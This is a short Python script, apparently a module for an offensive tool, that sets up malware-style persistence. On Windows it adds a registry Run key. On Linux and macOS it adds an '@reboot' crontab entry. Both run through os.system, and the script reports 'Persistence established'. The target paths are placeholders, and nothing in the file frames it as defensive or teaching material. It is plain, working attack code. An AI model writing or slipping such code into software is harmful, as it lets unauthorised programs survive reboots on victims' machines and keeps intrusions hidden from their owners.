import os

def establish_persistence():
    if os.name == 'nt':
        # Windows persistence example: adding a startup entry
        command = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v MyApp /t REG_SZ /d "C:\\Path\\To\\YourApp.exe" /f'
        os.system(command)
        return "Persistence established on Windows"

    elif os.name == 'posix':
        # Linux/MacOS persistence example: adding a cron job
        command = '(crontab -l ; echo "@reboot /path/to/your/script.sh") | crontab -'
        os.system(command)
        return "Persistence established on Linux/MacOS"

def execute(*args):
    return establish_persistence()

if __name__ == "__main__":
    print(establish_persistence())

